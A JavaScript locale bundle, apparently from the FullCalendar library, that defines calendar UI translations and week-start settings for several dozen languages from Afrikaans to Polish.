[].push.apply(FullCalendar.globalLocales, function () {
  'use strict';

  var l0 = {
    code: 'af',
    week: {
      dow: 1, // Maandag is die eerste dag van die week.
      doy: 4, // Die week wat die 4de Januarie bevat is die eerste week van die jaar.
    },
    buttonText: {
      prev: 'Vorige',
      next: 'Volgende',
      today: 'Vandag',
      year: 'Jaar',
      month: 'Maand',
      week: 'Week',
      day: 'Dag',
      list: 'Agenda',
    },
    allDayText: 'Heeldag',
    moreLinkText: 'Addisionele',
    noEventsText: 'Daar is geen gebeurtenisse nie',
  };

  var l1 = {
    code: 'ar-dz',
    week: {
      dow: 0, // Sunday is the first day of the week.
      doy: 4, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l2 = {
    code: 'ar-kw',
    week: {
      dow: 0, // Sunday is the first day of the week.
      doy: 12, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l3 = {
    code: 'ar-ly',
    week: {
      dow: 6, // Saturday is the first day of the week.
      doy: 12, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l4 = {
    code: 'ar-ma',
    week: {
      dow: 6, // Saturday is the first day of the week.
      doy: 12, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l5 = {
    code: 'ar-sa',
    week: {
      dow: 0, // Sunday is the first day of the week.
      doy: 6, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l6 = {
    code: 'ar-tn',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l7 = {
    code: 'ar',
    week: {
      dow: 6, // Saturday is the first day of the week.
      doy: 12, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'السابق',
      next: 'التالي',
      today: 'اليوم',
      month: 'شهر',
      week: 'أسبوع',
      day: 'يوم',
      list: 'أجندة',
    },
    weekText: 'أسبوع',
    allDayText: 'اليوم كله',
    moreLinkText: 'أخرى',
    noEventsText: 'أي أحداث لعرض',
  };

  var l8 = {
    code: 'az',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Əvvəl',
      next: 'Sonra',
      today: 'Bu Gün',
      month: 'Ay',
      week: 'Həftə',
      day: 'Gün',
      list: 'Gündəm',
    },
    weekText: 'Həftə',
    allDayText: 'Bütün Gün',
    moreLinkText: function(n) {
      return '+ daha çox ' + n
    },
    noEventsText: 'Göstərmək üçün hadisə yoxdur',
  };

  var l9 = {
    code: 'bg',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'назад',
      next: 'напред',
      today: 'днес',
      month: 'Месец',
      week: 'Седмица',
      day: 'Ден',
      list: 'График',
    },
    allDayText: 'Цял ден',
    moreLinkText: function(n) {
      return '+още ' + n
    },
    noEventsText: 'Няма събития за показване',
  };

  var l10 = {
    code: 'bn',
    week: {
      dow: 0, // Sunday is the first day of the week.
      doy: 6, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'পেছনে',
      next: 'সামনে',
      today: 'আজ',
      month: 'মাস',
      week: 'সপ্তাহ',
      day: 'দিন',
      list: 'তালিকা',
    },
    weekText: 'সপ্তাহ',
    allDayText: 'সারাদিন',
    moreLinkText: function(n) {
      return '+অন্যান্য ' + n
    },
    noEventsText: 'কোনো ইভেন্ট নেই',
  };

  var l11 = {
    code: 'bs',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Prošli',
      next: 'Sljedeći',
      today: 'Danas',
      month: 'Mjesec',
      week: 'Sedmica',
      day: 'Dan',
      list: 'Raspored',
    },
    weekText: 'Sed',
    allDayText: 'Cijeli dan',
    moreLinkText: function(n) {
      return '+ još ' + n
    },
    noEventsText: 'Nema događaja za prikazivanje',
  };

  var l12 = {
    code: 'ca',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Anterior',
      next: 'Següent',
      today: 'Avui',
      month: 'Mes',
      week: 'Setmana',
      day: 'Dia',
      list: 'Agenda',
    },
    weekText: 'Set',
    allDayText: 'Tot el dia',
    moreLinkText: 'més',
    noEventsText: 'No hi ha esdeveniments per mostrar',
  };

  var l13 = {
    code: 'cs',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Dříve',
      next: 'Později',
      today: 'Nyní',
      month: 'Měsíc',
      week: 'Týden',
      day: 'Den',
      list: 'Agenda',
    },
    weekText: 'Týd',
    allDayText: 'Celý den',
    moreLinkText: function(n) {
      return '+další: ' + n
    },
    noEventsText: 'Žádné akce k zobrazení',
  };

  var l14 = {
    code: 'cy',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Blaenorol',
      next: 'Nesaf',
      today: 'Heddiw',
      year: 'Blwyddyn',
      month: 'Mis',
      week: 'Wythnos',
      day: 'Dydd',
      list: 'Rhestr',
    },
    weekText: 'Wythnos',
    allDayText: 'Trwy\'r dydd',
    moreLinkText: 'Mwy',
    noEventsText: 'Dim digwyddiadau',
  };

  var l15 = {
    code: 'da',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Forrige',
      next: 'Næste',
      today: 'I dag',
      month: 'Måned',
      week: 'Uge',
      day: 'Dag',
      list: 'Agenda',
    },
    weekText: 'Uge',
    allDayText: 'Hele dagen',
    moreLinkText: 'flere',
    noEventsText: 'Ingen arrangementer at vise',
  };

  function affix$1(buttonText) {
    return (buttonText === 'Tag' || buttonText === 'Monat') ? 'r' :
      buttonText === 'Jahr' ? 's' : ''
  }

  var l16 = {
    code: 'de-at',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Zurück',
      next: 'Vor',
      today: 'Heute',
      year: 'Jahr',
      month: 'Monat',
      week: 'Woche',
      day: 'Tag',
      list: 'Terminübersicht',
    },
    weekText: 'KW',
    weekTextLong: 'Woche',
    allDayText: 'Ganztägig',
    moreLinkText: function(n) {
      return '+ weitere ' + n
    },
    noEventsText: 'Keine Ereignisse anzuzeigen',
    buttonHints: {
      prev(buttonText) {
        return `Vorherige${affix$1(buttonText)} ${buttonText}`
      },
      next(buttonText) {
        return `Nächste${affix$1(buttonText)} ${buttonText}`
      },
      today(buttonText) {
        // → Heute, Diese Woche, Dieser Monat, Dieses Jahr
        if (buttonText === 'Tag') {
          return 'Heute'
        }
        return `Diese${affix$1(buttonText)} ${buttonText}`
      },
    },
    viewHint(buttonText) {
      // → Tagesansicht, Wochenansicht, Monatsansicht, Jahresansicht
      const glue = buttonText === 'Woche' ? 'n' : buttonText === 'Monat' ? 's' : 'es';
      return buttonText + glue + 'ansicht'
    },
    navLinkHint: 'Gehe zu $0',
    moreLinkHint(eventCnt) {
      return 'Zeige ' + (eventCnt === 1 ?
        'ein weiteres Ereignis' :
        eventCnt + ' weitere Ereignisse')
    },
    closeHint: 'Schließen',
    timeHint: 'Uhrzeit',
    eventHint: 'Ereignis',
  };

  function affix(buttonText) {
    return (buttonText === 'Tag' || buttonText === 'Monat') ? 'r' :
      buttonText === 'Jahr' ? 's' : ''
  }

  var l17 = {
    code: 'de',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Zurück',
      next: 'Vor',
      today: 'Heute',
      year: 'Jahr',
      month: 'Monat',
      week: 'Woche',
      day: 'Tag',
      list: 'Terminübersicht',
    },
    weekText: 'KW',
    weekTextLong: 'Woche',
    allDayText: 'Ganztägig',
    moreLinkText: function(n) {
      return '+ weitere ' + n
    },
    noEventsText: 'Keine Ereignisse anzuzeigen',
    buttonHints: {
      prev(buttonText) {
        return `Vorherige${affix(buttonText)} ${buttonText}`
      },
      next(buttonText) {
        return `Nächste${affix(buttonText)} ${buttonText}`
      },
      today(buttonText) {
        // → Heute, Diese Woche, Dieser Monat, Dieses Jahr
        if (buttonText === 'Tag') {
          return 'Heute'
        }
        return `Diese${affix(buttonText)} ${buttonText}`
      },
    },
    viewHint(buttonText) {
      // → Tagesansicht, Wochenansicht, Monatsansicht, Jahresansicht
      const glue = buttonText === 'Woche' ? 'n' : buttonText === 'Monat' ? 's' : 'es';
      return buttonText + glue + 'ansicht'
    },
    navLinkHint: 'Gehe zu $0',
    moreLinkHint(eventCnt) {
      return 'Zeige ' + (eventCnt === 1 ?
        'ein weiteres Ereignis' :
        eventCnt + ' weitere Ereignisse')
    },
    closeHint: 'Schließen',
    timeHint: 'Uhrzeit',
    eventHint: 'Ereignis',
  };

  var l18 = {
    code: 'el',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4st is the first week of the year.
    },
    buttonText: {
      prev: 'Προηγούμενος',
      next: 'Επόμενος',
      today: 'Σήμερα',
      month: 'Μήνας',
      week: 'Εβδομάδα',
      day: 'Ημέρα',
      list: 'Ατζέντα',
    },
    weekText: 'Εβδ',
    allDayText: 'Ολοήμερο',
    moreLinkText: 'περισσότερα',
    noEventsText: 'Δεν υπάρχουν γεγονότα προς εμφάνιση',
  };

  var l19 = {
    code: 'en-au',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonHints: {
      prev: 'Previous $0',
      next: 'Next $0',
      today: 'This $0',
    },
    viewHint: '$0 view',
    navLinkHint: 'Go to $0',
    moreLinkHint(eventCnt) {
      return `Show ${eventCnt} more event${eventCnt === 1 ? '' : 's'}`
    },
  };

  var l20 = {
    code: 'en-gb',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonHints: {
      prev: 'Previous $0',
      next: 'Next $0',
      today: 'This $0',
    },
    viewHint: '$0 view',
    navLinkHint: 'Go to $0',
    moreLinkHint(eventCnt) {
      return `Show ${eventCnt} more event${eventCnt === 1 ? '' : 's'}`
    },
  };

  var l21 = {
    code: 'en-nz',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonHints: {
      prev: 'Previous $0',
      next: 'Next $0',
      today: 'This $0',
    },
    viewHint: '$0 view',
    navLinkHint: 'Go to $0',
    moreLinkHint(eventCnt) {
      return `Show ${eventCnt} more event${eventCnt === 1 ? '' : 's'}`
    },
  };

  var l22 = {
    code: 'eo',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Antaŭa',
      next: 'Sekva',
      today: 'Hodiaŭ',
      month: 'Monato',
      week: 'Semajno',
      day: 'Tago',
      list: 'Tagordo',
    },
    weekText: 'Sm',
    allDayText: 'Tuta tago',
    moreLinkText: 'pli',
    noEventsText: 'Neniuj eventoj por montri',
  };

  var l23 = {
    code: 'es',
    week: {
      dow: 0, // Sunday is the first day of the week.
      doy: 6, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Ant',
      next: 'Sig',
      today: 'Hoy',
      month: 'Mes',
      week: 'Semana',
      day: 'Día',
      list: 'Agenda',
    },
    weekText: 'Sm',
    allDayText: 'Todo el día',
    moreLinkText: 'más',
    noEventsText: 'No hay eventos para mostrar',
  };

  var l24 = {
    code: 'es',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Ant',
      next: 'Sig',
      today: 'Hoy',
      month: 'Mes',
      week: 'Semana',
      day: 'Día',
      list: 'Agenda',
    },
    buttonHints: {
      prev: '$0 antes',
      next: '$0 siguiente',
      today(buttonText) {
        return (buttonText === 'Día') ? 'Hoy' :
          ((buttonText === 'Semana') ? 'Esta' : 'Este') + ' ' + buttonText.toLocaleLowerCase()
      },
    },
    viewHint(buttonText) {
      return 'Vista ' + (buttonText === 'Semana' ? 'de la' : 'del') + ' ' + buttonText.toLocaleLowerCase()
    },
    weekText: 'Sm',
    weekTextLong: 'Semana',
    allDayText: 'Todo el día',
    moreLinkText: 'más',
    moreLinkHint(eventCnt) {
      return `Mostrar ${eventCnt} eventos más`
    },
    noEventsText: 'No hay eventos para mostrar',
    navLinkHint: 'Ir al $0',
    closeHint: 'Cerrar',
    timeHint: 'La hora',
    eventHint: 'Evento',
  };

  var l25 = {
    code: 'et',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Eelnev',
      next: 'Järgnev',
      today: 'Täna',
      month: 'Kuu',
      week: 'Nädal',
      day: 'Päev',
      list: 'Päevakord',
    },
    weekText: 'näd',
    allDayText: 'Kogu päev',
    moreLinkText: function(n) {
      return '+ veel ' + n
    },
    noEventsText: 'Kuvamiseks puuduvad sündmused',
  };

  var l26 = {
    code: 'eu',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Aur',
      next: 'Hur',
      today: 'Gaur',
      month: 'Hilabetea',
      week: 'Astea',
      day: 'Eguna',
      list: 'Agenda',
    },
    weekText: 'As',
    allDayText: 'Egun osoa',
    moreLinkText: 'gehiago',
    noEventsText: 'Ez dago ekitaldirik erakusteko',
  };

  var l27 = {
    code: 'fa',
    week: {
      dow: 6, // Saturday is the first day of the week.
      doy: 12, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'قبلی',
      next: 'بعدی',
      today: 'امروز',
      month: 'ماه',
      week: 'هفته',
      day: 'روز',
      list: 'برنامه',
    },
    weekText: 'هف',
    allDayText: 'تمام روز',
    moreLinkText: function(n) {
      return 'بیش از ' + n
    },
    noEventsText: 'هیچ رویدادی به نمایش',
  };

  var l28 = {
    code: 'fi',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Edellinen',
      next: 'Seuraava',
      today: 'Tänään',
      month: 'Kuukausi',
      week: 'Viikko',
      day: 'Päivä',
      list: 'Tapahtumat',
    },
    weekText: 'Vk',
    allDayText: 'Koko päivä',
    moreLinkText: 'lisää',
    noEventsText: 'Ei näytettäviä tapahtumia',
  };

  var l29 = {
    code: 'fr',
    buttonText: {
      prev: 'Précédent',
      next: 'Suivant',
      today: "Aujourd'hui",
      year: 'Année',
      month: 'Mois',
      week: 'Semaine',
      day: 'Jour',
      list: 'Mon planning',
    },
    weekText: 'Sem.',
    allDayText: 'Toute la journée',
    moreLinkText: 'en plus',
    noEventsText: 'Aucun événement à afficher',
  };

  var l30 = {
    code: 'fr-ch',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Précédent',
      next: 'Suivant',
      today: 'Courant',
      year: 'Année',
      month: 'Mois',
      week: 'Semaine',
      day: 'Jour',
      list: 'Mon planning',
    },
    weekText: 'Sm',
    allDayText: 'Toute la journée',
    moreLinkText: 'en plus',
    noEventsText: 'Aucun événement à afficher',
  };

  var l31 = {
    code: 'fr',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Précédent',
      next: 'Suivant',
      today: "Aujourd'hui",
      year: 'Année',
      month: 'Mois',
      week: 'Semaine',
      day: 'Jour',
      list: 'Planning',
    },
    weekText: 'Sem.',
    allDayText: 'Toute la journée',
    moreLinkText: 'en plus',
    noEventsText: 'Aucun événement à afficher',
  };

  var l32 = {
    code: 'gl',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Ant',
      next: 'Seg',
      today: 'Hoxe',
      month: 'Mes',
      week: 'Semana',
      day: 'Día',
      list: 'Axenda',
    },
    weekText: 'Sm',
    allDayText: 'Todo o día',
    moreLinkText: 'máis',
    noEventsText: 'Non hai eventos para amosar',
  };

  var l33 = {
    code: 'he',
    direction: 'rtl',
    buttonText: {
      prev: 'הקודם',
      next: 'הבא',
      today: 'היום',
      month: 'חודש',
      week: 'שבוע',
      day: 'יום',
      list: 'סדר יום',
    },
    allDayText: 'כל היום',
    moreLinkText: 'אחר',
    noEventsText: 'אין אירועים להצגה',
    weekText: 'שבוע',
  };

  var l34 = {
    code: 'hi',
    week: {
      dow: 0, // Sunday is the first day of the week.
      doy: 6, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'पिछला',
      next: 'अगला',
      today: 'आज',
      month: 'महीना',
      week: 'सप्ताह',
      day: 'दिन',
      list: 'कार्यसूची',
    },
    weekText: 'हफ्ता',
    allDayText: 'सभी दिन',
    moreLinkText: function(n) {
      return '+अधिक ' + n
    },
    noEventsText: 'कोई घटनाओं को प्रदर्शित करने के लिए',
  };

  var l35 = {
    code: 'hr',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Prijašnji',
      next: 'Sljedeći',
      today: 'Danas',
      month: 'Mjesec',
      week: 'Tjedan',
      day: 'Dan',
      list: 'Raspored',
    },
    weekText: 'Tje',
    allDayText: 'Cijeli dan',
    moreLinkText: function(n) {
      return '+ još ' + n
    },
    noEventsText: 'Nema događaja za prikaz',
  };

  var l36 = {
    code: 'hu',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'vissza',
      next: 'előre',
      today: 'ma',
      month: 'Hónap',
      week: 'Hét',
      day: 'Nap',
      list: 'Lista',
    },
    weekText: 'Hét',
    allDayText: 'Egész nap',
    moreLinkText: 'további',
    noEventsText: 'Nincs megjeleníthető esemény',
  };

  var l37 = {
    code: 'hy-am',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Նախորդ',
      next: 'Հաջորդ',
      today: 'Այսօր',
      month: 'Ամիս',
      week: 'Շաբաթ',
      day: 'Օր',
      list: 'Օրվա ցուցակ',
    },
    weekText: 'Շաբ',
    allDayText: 'Ամբողջ օր',
    moreLinkText: function(n) {
      return '+ ևս ' + n
    },
    noEventsText: 'Բացակայում է իրադարձությունը ցուցադրելու',
  };

  var l38 = {
    code: 'id',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'mundur',
      next: 'maju',
      today: 'hari ini',
      month: 'Bulan',
      week: 'Minggu',
      day: 'Hari',
      list: 'Agenda',
    },
    weekText: 'Mg',
    allDayText: 'Sehari penuh',
    moreLinkText: 'lebih',
    noEventsText: 'Tidak ada acara untuk ditampilkan',
  };

  var l39 = {
    code: 'is',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Fyrri',
      next: 'Næsti',
      today: 'Í dag',
      month: 'Mánuður',
      week: 'Vika',
      day: 'Dagur',
      list: 'Dagskrá',
    },
    weekText: 'Vika',
    allDayText: 'Allan daginn',
    moreLinkText: 'meira',
    noEventsText: 'Engir viðburðir til að sýna',
  };

  var l40 = {
    code: 'it',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Prec',
      next: 'Succ',
      today: 'Oggi',
      month: 'Mese',
      week: 'Settimana',
      day: 'Giorno',
      list: 'Agenda',
    },
    weekText: 'Sm',
    allDayText: 'Tutto il giorno',
    moreLinkText: function(n) {
      return '+altri ' + n
    },
    noEventsText: 'Non ci sono eventi da visualizzare',
  };

  var l41 = {
    code: 'ja',
    buttonText: {
      prev: '前',
      next: '次',
      today: '今日',
      month: '月',
      week: '週',
      day: '日',
      list: '予定リスト',
    },
    weekText: '週',
    allDayText: '終日',
    moreLinkText: function(n) {
      return '他 ' + n + ' 件'
    },
    noEventsText: '表示する予定はありません',
  };

  var l42 = {
    code: 'ka',
    week: {
      dow: 1,
      doy: 7,
    },
    buttonText: {
      prev: 'წინა',
      next: 'შემდეგი',
      today: 'დღეს',
      month: 'თვე',
      week: 'კვირა',
      day: 'დღე',
      list: 'დღის წესრიგი',
    },
    weekText: 'კვ',
    allDayText: 'მთელი დღე',
    moreLinkText: function(n) {
      return '+ კიდევ ' + n
    },
    noEventsText: 'ღონისძიებები არ არის',
  };

  var l43 = {
    code: 'kk',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Алдыңғы',
      next: 'Келесі',
      today: 'Бүгін',
      month: 'Ай',
      week: 'Апта',
      day: 'Күн',
      list: 'Күн тәртібі',
    },
    weekText: 'Не',
    allDayText: 'Күні бойы',
    moreLinkText: function(n) {
      return '+ тағы ' + n
    },
    noEventsText: 'Көрсету үшін оқиғалар жоқ',
  };

  var l44 = {
    code: 'km',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'មុន',
      next: 'បន្ទាប់',
      today: 'ថ្ងៃនេះ',
      year: 'ឆ្នាំ',
      month: 'ខែ',
      week: 'សប្តាហ៍',
      day: 'ថ្ងៃ',
      list: 'បញ្ជី',
    },
    weekText: 'សប្តាហ៍',
    allDayText: 'ពេញមួយថ្ងៃ',
    moreLinkText: 'ច្រើនទៀត',
    noEventsText: 'គ្មានព្រឹត្តិការណ៍ត្រូវបង្ហាញ',
  };

  var l45 = {
    code: 'ko',
    buttonText: {
      prev: '이전달',
      next: '다음달',
      today: '오늘',
      month: '월',
      week: '주',
      day: '일',
      list: '일정목록',
    },
    weekText: '주',
    allDayText: '종일',
    moreLinkText: '개',
    noEventsText: '일정이 없습니다',
  };

  var l46 = {
    code: 'ku',
    week: {
      dow: 6, // Saturday is the first day of the week.
      doy: 12, // The week that contains Jan 1st is the first week of the year.
    },
    direction: 'rtl',
    buttonText: {
      prev: 'پێشتر',
      next: 'دواتر',
      today: 'ئەمڕو',
      month: 'مانگ',
      week: 'هەفتە',
      day: 'ڕۆژ',
      list: 'بەرنامە',
    },
    weekText: 'هەفتە',
    allDayText: 'هەموو ڕۆژەکە',
    moreLinkText: 'زیاتر',
    noEventsText: 'هیچ ڕووداوێك نیە',
  };

  var l47 = {
    code: 'lb',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Zréck',
      next: 'Weider',
      today: 'Haut',
      month: 'Mount',
      week: 'Woch',
      day: 'Dag',
      list: 'Terminiwwersiicht',
    },
    weekText: 'W',
    allDayText: 'Ganzen Dag',
    moreLinkText: 'méi',
    noEventsText: 'Nee Evenementer ze affichéieren',
  };

  var l48 = {
    code: 'lt',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Atgal',
      next: 'Pirmyn',
      today: 'Šiandien',
      month: 'Mėnuo',
      week: 'Savaitė',
      day: 'Diena',
      list: 'Darbotvarkė',
    },
    weekText: 'SAV',
    allDayText: 'Visą dieną',
    moreLinkText: 'daugiau',
    noEventsText: 'Nėra įvykių rodyti',
  };

  var l49 = {
    code: 'lv',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Iepr.',
      next: 'Nāk.',
      today: 'Šodien',
      month: 'Mēnesis',
      week: 'Nedēļa',
      day: 'Diena',
      list: 'Dienas kārtība',
    },
    weekText: 'Ned.',
    allDayText: 'Visu dienu',
    moreLinkText: function(n) {
      return '+vēl ' + n
    },
    noEventsText: 'Nav notikumu',
  };

  var l50 = {
    code: 'mk',
    buttonText: {
      prev: 'претходно',
      next: 'следно',
      today: 'Денес',
      month: 'Месец',
      week: 'Недела',
      day: 'Ден',
      list: 'График',
    },
    weekText: 'Сед',
    allDayText: 'Цел ден',
    moreLinkText: function(n) {
      return '+повеќе ' + n
    },
    noEventsText: 'Нема настани за прикажување',
  };

  var l51 = {
    code: 'ms',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Sebelum',
      next: 'Selepas',
      today: 'hari ini',
      month: 'Bulan',
      week: 'Minggu',
      day: 'Hari',
      list: 'Agenda',
    },
    weekText: 'Mg',
    allDayText: 'Sepanjang hari',
    moreLinkText: function(n) {
      return 'masih ada ' + n + ' acara'
    },
    noEventsText: 'Tiada peristiwa untuk dipaparkan',
  };

  var l52 = {
    code: 'nb',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Forrige',
      next: 'Neste',
      today: 'I dag',
      month: 'Måned',
      week: 'Uke',
      day: 'Dag',
      list: 'Agenda',
    },
    weekText: 'Uke',
    weekTextLong: 'Uke',
    allDayText: 'Hele dagen',
    moreLinkText: 'til',
    noEventsText: 'Ingen hendelser å vise',
    buttonHints: {
      prev: 'Forrige $0',
      next: 'Neste $0',
      today: 'Nåværende $0',
    },
    viewHint: '$0 visning',
    navLinkHint: 'Gå til $0',
    moreLinkHint(eventCnt) {
      return `Vis ${eventCnt} flere hendelse${eventCnt === 1 ? '' : 'r'}`
    },
  };

  var l53 = {
    code: 'ne', // code for nepal
    week: {
      dow: 7, // Sunday is the first day of the week.
      doy: 1, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'अघिल्लो',
      next: 'अर्को',
      today: 'आज',
      month: 'महिना',
      week: 'हप्ता',
      day: 'दिन',
      list: 'सूची',
    },
    weekText: 'हप्ता',
    allDayText: 'दिनभरि',
    moreLinkText: 'थप लिंक',
    noEventsText: 'देखाउनको लागि कुनै घटनाहरू छैनन्',
  };

  var l54 = {
    code: 'nl',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Vorige',
      next: 'Volgende',
      today: 'Vandaag',
      year: 'Jaar',
      month: 'Maand',
      week: 'Week',
      day: 'Dag',
      list: 'Agenda',
    },
    allDayText: 'Hele dag',
    moreLinkText: 'extra',
    noEventsText: 'Geen evenementen om te laten zien',
  };

  var l55 = {
    code: 'nn',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Førre',
      next: 'Neste',
      today: 'I dag',
      month: 'Månad',
      week: 'Veke',
      day: 'Dag',
      list: 'Agenda',
    },
    weekText: 'Veke',
    allDayText: 'Heile dagen',
    moreLinkText: 'til',
    noEventsText: 'Ingen hendelser å vise',
  };

  var l56 = {
    code: 'pl',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Poprzedni',
      next: 'Następny',
      today: 'Dziś',
      month: 'Miesiąc',
      week: 'Tydzień',
      day: 'Dzień',
      list: 'Plan dnia',
    },
    weekText: 'Tydz',
    allDayText: 'Cały dzień',
    moreLinkText: 'więcej',
    noEventsText: 'Brak wydarzeń do wyświetlenia',
  };

